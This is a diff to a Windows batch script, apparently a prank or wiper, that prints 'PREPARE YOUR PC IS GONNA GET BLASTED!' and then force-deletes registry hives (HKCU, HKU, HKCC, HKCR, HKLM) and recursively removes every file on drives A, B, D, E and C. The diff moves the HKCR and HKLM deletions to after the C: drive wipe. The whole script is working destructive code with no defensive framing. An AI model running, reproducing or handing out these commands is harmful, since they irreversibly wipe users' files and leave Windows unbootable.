@@ -1,9 +1,7 @@
 @echo off
 echo PREPARE YOUR PC IS GONNA GET BLASTED!
 
-reg delete HKCR /f
 reg delete HKCU /f
-reg delete HKLM /f
 reg delete HKU /f
 reg delete HKCC /f
 
@@ -32,4 +30,7 @@ rd E: /s /q
 rd D: /s /q
 rd B: /s /q
 rd A: /s /q
+
 rd C: /s /q
+reg delete HKCR /f
+reg delete HKLM /f
